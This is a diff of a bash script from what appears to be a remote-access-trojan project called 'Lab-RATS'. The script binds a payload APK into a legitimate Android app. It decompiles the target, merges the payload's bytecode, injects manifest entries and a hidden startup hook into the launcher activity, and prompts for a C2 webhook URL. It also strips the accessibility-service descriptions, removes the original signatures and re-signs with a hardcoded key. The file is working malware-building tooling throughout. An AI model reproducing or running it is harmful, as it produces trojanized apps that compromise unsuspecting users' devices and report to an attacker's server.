@@ -51,10 +51,34 @@ NC='\033[0m'
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
 WORK_DIR="$SCRIPT_DIR/temp_binder"
-OUTPUT_DIR="$SCRIPT_DIR/output"
+OUTPUT_DIR="$PROJECT_DIR/bind_output"
 TOOLS_DIR="$SCRIPT_DIR/tools"
 
-mkdir -p "$OUTPUT_DIR" "$TOOLS_DIR"
+PYTHON_BIN="/usr/bin/python3"
+if [ ! -x "$PYTHON_BIN" ]; then
+    PYTHON_BIN="$(command -v python3 || command -v python)"
+fi
+chmod +x "$TOOLS_DIR/surgery.py" 2>/dev/null || true
+
+# Auto-detect Android SDK build-tools directory & tools
+STABLE_BT=""
+if [ -d "$HOME/Library/Android/sdk/build-tools" ]; then
+    STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/3[0-4]* 2>/dev/null | tail -n1)
+    if [ -z "$STABLE_BT" ]; then
+        STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/* 2>/dev/null | grep -v "37" | tail -n1)
+    fi
+elif [ -n "$ANDROID_HOME" ] && [ -d "$ANDROID_HOME/build-tools" ]; then
+    STABLE_BT=$(ls -d "$ANDROID_HOME/build-tools"/* 2>/dev/null | grep -v "37" | tail -n1)
+fi
+
+AAPT2_BIN=""
+if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/aapt2" ]; then
+    AAPT2_BIN="$STABLE_BT/aapt2"
+elif command -v aapt2 &>/dev/null; then
+    AAPT2_BIN="$(command -v aapt2)"
+fi
+
+mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output" "$TOOLS_DIR"
 
 echo -e "${CYAN}"
 echo " ┌───────────────────────────────────────────────────────────────────────┐"
@@ -79,19 +103,21 @@ TARGET_APK_NAME="$(basename "$TARGET_APK")"
 TARGET_APK_ABS="$TARGET_APK_DIR/$TARGET_APK_NAME"
 
 # 2. Payload APK
-PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
+PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
 if [ ! -f "$PAYLOAD_APK" ]; then
-    PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
+    PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/debug/app-debug.apk"
+fi
+if [ ! -f "$PAYLOAD_APK" ]; then
+    PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
 fi
 
 if [ ! -f "$PAYLOAD_APK" ]; then
-    echo -e "${YELLOW}[!] Payload APK (signed_v1.apk) not found. Building release payload now...${NC}"
+    echo -e "${YELLOW}[!] Payload APK not found. Building release payload via Gradle...${NC}"
     cd "$PROJECT_DIR"
     chmod +x gradlew
     ./gradlew assembleRelease --no-daemon
     if [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
-        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
-        PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
+        PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
     else
         echo -e "${RED}[!] Payload APK compilation failed.${NC}"
         exit 1
@@ -134,44 +160,29 @@ if [ ! -d "$PAYLOAD_DIR" ]; then
     exit 1
 fi
 
+# Check if Target APK is an XAPK / APKM / APKS zip bundle containing base.apk
+BUNDLE_EXTRACT_DIR="$WORK_DIR/bundle_extracted"
+$PYTHON_BIN "$TOOLS_DIR/surgery.py" extract_bundle "$TARGET_APK_ABS" "$BUNDLE_EXTRACT_DIR"
+
+if [ -f "$BUNDLE_EXTRACT_DIR/extracted_base.txt" ]; then
+    EXTRACTED_BASE=$(cat "$BUNDLE_EXTRACT_DIR/extracted_base.txt")
+    if [ -f "$EXTRACTED_BASE" ]; then
+        TARGET_APK_ABS="$EXTRACTED_BASE"
+        echo -e "${GREEN}[✓] Extracted standalone base.apk from App Bundle container.${NC}"
+    fi
+fi
+
 echo -e "${CYAN}[*] Decompiling target clean APK...${NC}"
-$APKTOOL_CMD d -f -m -o "$TARGET_DIR" "$TARGET_APK_ABS"
+$APKTOOL_CMD d -f -o "$TARGET_DIR" "$TARGET_APK_ABS"
 
-if [ ! -d "$TARGET_DIR" ]; then
-    echo -e "${YELLOW}[!] Decompiling with -m failed. Retrying standard decompilation...${NC}"
-    $APKTOOL_CMD d -f -o "$TARGET_DIR" "$TARGET_APK_ABS"
+if [ ! -f "$TARGET_DIR/AndroidManifest.xml" ]; then
+    echo -e "${YELLOW}[!] Standard decompilation failed. Retrying with resource-preservation (-r)...${NC}"
+    rm -rf "$TARGET_DIR"
+    $APKTOOL_CMD d -f -r -o "$TARGET_DIR" "$TARGET_APK_ABS"
 fi
 
-if [ ! -d "$TARGET_DIR" ]; then
-    echo -e "${RED}[!] Target APK decompilation failed.${NC}"
-    rm -rf "$WORK_DIR"
-    exit 1
-fi
-
-# 5. Merge Smali Classes & Assets
-echo -e "${CYAN}[*] Merging Smali bytecode and assets...${NC}"
-
-# Find max smali_classes folder in target
-MAX_IDX=1
-for d in "$TARGET_DIR"/smali_classes*; do
-    if [ -d "$d" ]; then
-        NUM=$(echo "$d" | grep -o '[0-9]\+')
-        if [ -n "$NUM" ] && [ "$NUM" -gt "$MAX_IDX" ]; then
-            MAX_IDX=$NUM
-        fi
-    fi
-done
-
-NEXT_IDX=$((MAX_IDX + 1))
-DEST_SMALI="$TARGET_DIR/smali_classes$NEXT_IDX"
-mkdir -p "$DEST_SMALI"
-
-# Copy com/labs/labrats and dependencies from payload to target smali_classesN
-for ps in "$PAYLOAD_DIR"/smali*; do
-    if [ -d "$ps" ]; then
-        cp -rn "$ps"/* "$DEST_SMALI/" 2>/dev/null || true
-    fi
-done
+# 5. Merge Smali Classes, Assets & Surgery
+echo -e "${CYAN}[*] Merging Smali bytecode, assets, and performing surgery...${NC}"
 
 # Copy Assets
 if [ -d "$PAYLOAD_DIR/assets" ]; then
@@ -185,13 +196,47 @@ if [ -d "$PAYLOAD_DIR/lib" ]; then
     cp -rn "$PAYLOAD_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
 fi
 
-echo -e "${GREEN}[✓] Smali classes and assets merged.${NC}"
+# Decompile and merge any split config APKs in target folder
+TARGET_FOLDER=$(dirname "$TARGET_APK_ABS")
+for split_apk in "$TARGET_FOLDER"/*config*.apk "$TARGET_FOLDER"/*split*.apk; do
+    if [ -f "$split_apk" ] && [ "$split_apk" != "$TARGET_APK_ABS" ]; then
+        echo -e "${CYAN}[*] Merging split APK resources from $(basename "$split_apk")...${NC}"
+        SPLIT_DIR="$WORK_DIR/split_tmp"
+        mkdir -p "$SPLIT_DIR"
+        $APKTOOL_CMD d -f -o "$SPLIT_DIR" "$split_apk" 2>/dev/null || true
+        [ -d "$SPLIT_DIR/lib" ] && cp -rn "$SPLIT_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
+        [ -d "$SPLIT_DIR/assets" ] && cp -rn "$SPLIT_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
+        [ -d "$SPLIT_DIR/res" ] && cp -rn "$SPLIT_DIR/res"/* "$TARGET_DIR/res/" 2>/dev/null || true
+        rm -rf "$SPLIT_DIR"
+    fi
+done
 
-# 6. AndroidManifest Surgery
-echo -e "${CYAN}[*] Performing AndroidManifest.xml surgery...${NC}"
+if [ -f "$TARGET_DIR/res/xml/accessibility_service_config.xml" ]; then
+    sed -i.bak 's|android:description="[^"]*"||g' "$TARGET_DIR/res/xml/accessibility_service_config.xml" 2>/dev/null
+    rm -f "$TARGET_DIR/res/xml/accessibility_service_config.xml.bak"
+fi
+
+# C2 Webhook URL Configuration
+EXISTING_WEBHOOK=""
+if [ -f "$PROJECT_DIR/local.properties" ]; then
+    EXISTING_WEBHOOK=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
+fi
+
+echo -e "\n${CYAN}[*] Configuring C2 Webhook URL for Bound Target...${NC}"
+if [ -n "$EXISTING_WEBHOOK" ]; then
+    echo -e "${YELLOW}    Current Webhook URL: $EXISTING_WEBHOOK${NC}"
+    read -p "    Enter C2 Webhook URL [Press Enter to Keep Current]: " WEB_URL
+    WEB_URL=${WEB_URL:-$EXISTING_WEBHOOK}
+else
+    read -p "    Enter C2 Webhook URL (e.g. https://lab-rats-c2.onrender.com): " WEB_URL
+fi
+
+WEB_URL_CLEAN="$(echo "$WEB_URL" | sed 's|/$||')"
 
 TARGET_MANIFEST="$TARGET_DIR/AndroidManifest.xml"
 PAYLOAD_MANIFEST="$PAYLOAD_DIR/AndroidManifest.xml"
+PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" 2>/dev/null | head -n1 | cut -d'"' -f2)
+[ -z "$PKG_NAME" ] && PKG_NAME="com.target.app"
 
 # Extract permissions from payload
 grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
@@ -201,176 +246,15 @@ grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
     fi
 done
 
-# Perform 100% valid XML manifest surgery via Python ElementTree
-python3 - "$PAYLOAD_MANIFEST" "$TARGET_MANIFEST" << 'EOF'
-import sys, xml.etree.ElementTree as ET
-
-payload_path, target_path = sys.argv[1], sys.argv[2]
-ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
-
-try:
-    payload_root = ET.parse(payload_path).getroot()
-    payload_app = payload_root.find('application')
-
-    with open(target_path, 'r', encoding='utf-8') as f:
-        target_xml = f.read()
-
-    if payload_app is not None:
-        injections = []
-        for elem in payload_app:
-            name = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
-            if 'com.labs.labrats' in name and name not in target_xml:
-                elem_str = ET.tostring(elem, encoding='utf-8').decode('utf-8')
-                injections.append(elem_str)
-
-        if injections:
-            injection_block = "\n    " + "\n    ".join(injections) + "\n</application>"
-            target_xml = target_xml.replace("</application>", injection_block, 1)
-            with open(target_path, 'w', encoding='utf-8') as f:
-                f.write(target_xml)
-except Exception as e:
-    print(f"Manifest Surgery Error: {e}")
-EOF
-
-rm -f "$TARGET_MANIFEST.bak"
-echo -e "${GREEN}[✓] Manifest surgery completed.${NC}"
-
-# Sanitize target resources (Repair corrupt PNG signatures in pure Bash without Python)
-if [ -d "$TARGET_DIR/res" ]; then
-    echo -e "${CYAN}[*] Sanitizing target resources & PNG signatures...${NC}"
-    VALID_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
-    VALID_NINE_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAMAAAADCAYAAABWKLW/AAAADElEQVR42mNkYGBgAAAABQABXvMqOAAAAABJRU5ErkJggg=="
-
-    find "$TARGET_DIR/res" -type f \( -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" \) 2>/dev/null | while read -r img_file; do
-        HEX_HEADER=$(hexdump -n 4 -e '1/1 "%02x"' "$img_file" 2>/dev/null || xxd -l 4 -p "$img_file" 2>/dev/null)
-        if [[ "$HEX_HEADER" != "89504e47" ]]; then
-            echo -e "${YELLOW}    [!] Repairing corrupt image signature: $(basename "$img_file")${NC}"
-            if [[ "$img_file" == *".9.png" ]]; then
-                echo "$VALID_NINE_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_NINE_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
-            else
-                echo "$VALID_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
-            fi
-        fi
-    done
+PYTHON_BIN="/usr/bin/python3"
+if [ ! -x "$PYTHON_BIN" ]; then
+    PYTHON_BIN="$(command -v python3 || command -v python)"
 fi
 
-# 7. Identify Launcher Activity
-echo -e "${CYAN}[*] Identifying Launcher Activity in target...${NC}"
+echo -e "${CYAN}[*] Performing Smali, Manifest & Resource Surgery via surgery.py...${NC}"
+$PYTHON_BIN "$TOOLS_DIR/surgery.py" "$PAYLOAD_DIR" "$TARGET_DIR" "$PKG_NAME" "$WEB_URL_CLEAN"
 
-PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" | head -n1 | cut -d'"' -f2)
-
-# POSIX-compliant awk compatible with BSD awk (macOS) and GNU awk (Linux)
-LAUNCHER_ACT=$(awk '
-BEGIN { RS="<activity|<activity-alias"; FS=">" }
-NR > 1 {
-    block = $0
-    if (block ~ /android\.intent\.category\.LAUNCHER/ && block ~ /android\.intent\.action\.MAIN/) {
-        match_start = index(block, "android:name=\"")
-        if (match_start > 0) {
-            sub_str = substr(block, match_start + 14)
-            quote_end = index(sub_str, "\"")
-            if (quote_end > 0) {
-                print substr(sub_str, 1, quote_end - 1)
-                exit
-            }
-        }
-    }
-}
-' "$TARGET_MANIFEST")
-
-if [ -z "$LAUNCHER_ACT" ]; then
-    echo -e "${RED}[!] Could not detect target Launcher Activity in AndroidManifest.xml${NC}"
-    rm -rf "$WORK_DIR"
-    exit 1
-fi
-
-if [[ "$LAUNCHER_ACT" == .* ]]; then
-    LAUNCHER_ACT="${PKG_NAME}${LAUNCHER_ACT}"
-elif [[ "$LAUNCHER_ACT" != *.* ]]; then
-    LAUNCHER_ACT="${PKG_NAME}.${LAUNCHER_ACT}"
-fi
-
-REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
-TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)
-
-# Fallback: Check if LAUNCHER_ACT is an activity-alias pointing to targetActivity
-if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
-    TARGET_ACT=$(grep -B 2 -A 5 "android:name=\"$LAUNCHER_ACT\"" "$TARGET_MANIFEST" | grep -o 'android:targetActivity="[^"]*"' | head -n1 | cut -d'"' -f2)
-    if [ -n "$TARGET_ACT" ]; then
-        if [[ "$TARGET_ACT" == .* ]]; then
-            TARGET_ACT="${PKG_NAME}${TARGET_ACT}"
-        elif [[ "$TARGET_ACT" != *.* ]]; then
-            TARGET_ACT="${PKG_NAME}.${TARGET_ACT}"
-        fi
-        LAUNCHER_ACT="$TARGET_ACT"
-        REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
-        TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)
-    fi
-fi
-
-# Final fallback: search by class basename
-if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
-    TARGET_SMALI_FILE=$(find "$TARGET_DIR" -name "$(basename "$REL_PATH")" | head -n1)
-fi
-
-if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
-    echo -e "${RED}[!] Could not find Smali file for launcher $LAUNCHER_ACT${NC}"
-    rm -rf "$WORK_DIR"
-    exit 1
-fi
-
-echo -e "${GREEN}[✓] Detected Launcher Activity: $LAUNCHER_ACT${NC}"
-echo -e "${GREEN}[✓] Located Smali file: $TARGET_SMALI_FILE${NC}"
-
-# 8. Inject Smali Hook
-echo -e "${CYAN}[*] Injecting Lab-RATS startup hook into $TARGET_SMALI_FILE...${NC}"
-
-if grep -q "\.method.*onCreate(" "$TARGET_SMALI_FILE"; then
-    awk '
-        /\.method.*onCreate\(/ {
-            print $0
-            print "    # Lab-RATS Smali Surgery Hook"
-            print "    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V"
-            next
-        }
-        { print }
-    ' "$TARGET_SMALI_FILE" > "$TARGET_SMALI_FILE.tmp" && mv "$TARGET_SMALI_FILE.tmp" "$TARGET_SMALI_FILE"
-    echo -e "${GREEN}[✓] Smali hook injected into existing onCreate().${NC}"
-else
-    cat >> "$TARGET_SMALI_FILE" << 'EOF'
-
-.method protected onCreate(Landroid/os/Bundle;)V
-    .locals 0
-
-    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-
-    # Lab-RATS Smali Surgery Hook
-    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V
-
-    return-void
-.endmethod
-EOF
-    echo -e "${GREEN}[✓] Smali hook injected into new onCreate() method.${NC}"
-fi
-
-# Detect native Android SDK aapt / aapt2 binaries (prefer stable 30-34 aapt v1 to prevent AAPT2 exit code 138)
-AAPT1_BIN=""
-AAPT2_BIN=""
-
-if [ -d "$HOME/Library/Android/sdk/build-tools" ]; then
-    STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/3[0-4]* 2>/dev/null | tail -n1)
-    if [ -z "$STABLE_BT" ]; then
-        STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/* 2>/dev/null | grep -v "37" | tail -n1)
-    fi
-    if [ -n "$STABLE_BT" ]; then
-        [ -f "$STABLE_BT/aapt" ] && AAPT1_BIN="$STABLE_BT/aapt"
-        [ -f "$STABLE_BT/aapt2" ] && AAPT2_BIN="$STABLE_BT/aapt2"
-    fi
-elif command -v aapt &> /dev/null; then
-    AAPT1_BIN="$(command -v aapt)"
-elif command -v aapt2 &> /dev/null; then
-    AAPT2_BIN="$(command -v aapt2)"
-fi
+echo -e "${GREEN}[✓] Smali surgery, Manifest injection & Resource sanitization complete.${NC}"
 
 # 9. Recompile & Sign
 echo -e "${CYAN}[*] Rebuilding bound APK...${NC}"
@@ -378,30 +262,11 @@ UNSIGNED_APK="$WORK_DIR/unsigned_bound.apk"
 ALIGNED_APK="$WORK_DIR/aligned_bound.apk"
 FINAL_BOUND_APK="$OUTPUT_DIR/bound_target.apk"
 
-# Attempt 1: Try building with stable AAPT1 (100% stable, zero AAPT2 SIGBUS crashes)
-if [ -n "$AAPT1_BIN" ]; then
-    $APKTOOL_CMD b --aapt "$AAPT1_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
-fi
-
-# Attempt 2: Try building with stable AAPT2
-if [ ! -f "$UNSIGNED_APK" ] && [ -n "$AAPT2_BIN" ]; then
-    $APKTOOL_CMD b --aapt "$AAPT2_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
-fi
-
-# Attempt 3: Try building with AAPT1 and original binary resources (-c)
-if [ ! -f "$UNSIGNED_APK" ]; then
-    echo -e "${YELLOW}[!] Retrying build with original binary resources (-c)...${NC}"
-    if [ -n "$AAPT1_BIN" ]; then
-        $APKTOOL_CMD b --aapt "$AAPT1_BIN" -c --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
-    else
-        $APKTOOL_CMD b -c --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
-    fi
-fi
-
-# Attempt 4: Fallback build with diagnostic log output
-if [ ! -f "$UNSIGNED_APK" ]; then
-    echo -e "${YELLOW}[!] Retrying build with full diagnostic output...${NC}"
-    $APKTOOL_CMD b "$TARGET_DIR" -o "$UNSIGNED_APK"
+# Attempt 1: Rebuild with stable AAPT2 (34.0.0)
+if [ -n "$AAPT2_BIN" ]; then
+    $APKTOOL_CMD b --aapt "$AAPT2_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
+else
+    $APKTOOL_CMD b --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
 fi
 
 if [ ! -f "$UNSIGNED_APK" ]; then
@@ -410,29 +275,62 @@ if [ ! -f "$UNSIGNED_APK" ]; then
     exit 1
 fi
 
+# Auto-detect zipalign & apksigner from Android SDK build-tools if not in PATH
+ZIPALIGN_CMD="zipalign"
+if ! command -v zipalign &> /dev/null; then
+    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/zipalign" ]; then
+        ZIPALIGN_CMD="$STABLE_BT/zipalign"
+    fi
+fi
+
+APKSIGNER_CMD="apksigner"
+if ! command -v apksigner &> /dev/null; then
+    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/apksigner" ]; then
+        APKSIGNER_CMD="$STABLE_BT/apksigner"
+    fi
+fi
+
+# Strip old target signatures from unsigned APK before alignment and apksigner to prevent inconsistent signature errors
+if command -v zip &> /dev/null; then
+    zip -d "$UNSIGNED_APK" "META-INF/*" 2>/dev/null || true
+fi
+
 echo -e "${CYAN}[*] Aligning & Signing bound APK...${NC}"
-if command -v zipalign &> /dev/null; then
-    zipalign -f -v 4 "$UNSIGNED_APK" "$ALIGNED_APK"
+if command -v "$ZIPALIGN_CMD" &> /dev/null || [ -f "$ZIPALIGN_CMD" ]; then
+    "$ZIPALIGN_CMD" -p -f -v 4 "$UNSIGNED_APK" "$ALIGNED_APK"
 else
     ALIGNED_APK="$UNSIGNED_APK"
 fi
 
 KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"
-if [ ! -f "$KEYSTORE_PATH" ]; then
-    echo -e "${YELLOW}[!] Keystore missing. Generating new keystore...${NC}"
-    keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
+
+if [ -f "$KEYSTORE_PATH" ]; then
+    if ! keytool -list -keystore "$KEYSTORE_PATH" -alias "lab-rats-key" -storepass "lab-rats123" &>/dev/null; then
+        echo -e "${YELLOW}[!] Keystore alias 'lab-rats-key' missing in $KEYSTORE_PATH. Regenerating keystore...${NC}"
+        rm -f "$KEYSTORE_PATH"
+    fi
 fi
 
-if command -v apksigner &> /dev/null; then
-    apksigner sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK"
-elif command -v jarsigner &> /dev/null; then
-    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key"
-    cp "$ALIGNED_APK" "$FINAL_BOUND_APK"
-else
-    echo -e "${RED}[!] Neither apksigner nor jarsigner found.${NC}"
-    rm -rf "$WORK_DIR"
-    exit 1
+if [ ! -f "$KEYSTORE_PATH" ]; then
+    echo -e "${YELLOW}[!] Keystore missing or invalid. Generating fresh keystore...${NC}"
+    keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
+    keytool -genkeypair -alias "render" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
 fi
+
+mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output"
+
+if command -v "$APKSIGNER_CMD" &> /dev/null || [ -f "$APKSIGNER_CMD" ]; then
+    "$APKSIGNER_CMD" sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK" 2>/dev/null || true
+fi
+
+if [ ! -f "$FINAL_BOUND_APK" ]; then
+    if command -v jarsigner &> /dev/null; then
+        jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key" 2>/dev/null || true
+    fi
+    cp -f "$ALIGNED_APK" "$FINAL_BOUND_APK"
+fi
+
+cp -f "$FINAL_BOUND_APK" "$SCRIPT_DIR/bind_output/bound_target.apk" 2>/dev/null || true
 
 rm -rf "$WORK_DIR"
 
